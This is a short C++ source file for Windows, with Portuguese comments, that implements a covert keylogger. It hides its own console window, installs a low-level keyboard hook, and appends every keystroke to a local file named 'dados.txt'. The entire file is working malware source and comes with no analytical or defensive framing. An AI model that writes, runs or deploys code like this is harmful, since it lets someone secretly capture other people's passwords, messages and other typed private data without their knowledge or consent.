#include<iostream>
#include<windows.h>
#include<fstream>

using namespace std;

HHOOK hook;

LRESULT CALLBACK funcHook(int codigo, WPARAM wParam, LPARAM lParam);
//log para armazenar as chaves encont
void LOG(string input){
	fstream Logfile;
	Logfile.open("dados.txt", fstream::app);
	if(Logfile.is_open()){
		Logfile << input;
		Logfile.close();
	}
}

int main(){
//ESconde o terminal
		HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, SW_HIDE);
//	std::cout << "isso nao devia aparecer" ;  
		MSG msg;
		hook = SetWindowsHookExA(WH_KEYBOARD_LL, funcHook, NULL , 0);
		if(hook == NULL){
		printf("Error");
			return(1);
	}
	while (GetMessage(&msg, NULL, 0, 0) != 0){
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	UnhookWindowsHookEx(hook);
		}
		
LRESULT CALLBACK funcHook(int codigo, WPARAM wParam,LPARAM lParam){
	PKBDLLHOOKSTRUCT kbDllHook = (PKBDLLHOOKSTRUCT)lParam;//info em baixo nivel da movimetaç do teclado
	if(wParam == WM_KEYDOWN && codigo == HC_ACTION)
	{
		char key = static_cast<char>(kbDllHook->vkCode);
	  printf("%c",key);
	  LOG(string(1, key));
	}
	return(CallNextHookEx(hook,codigo, wParam, lParam));
}
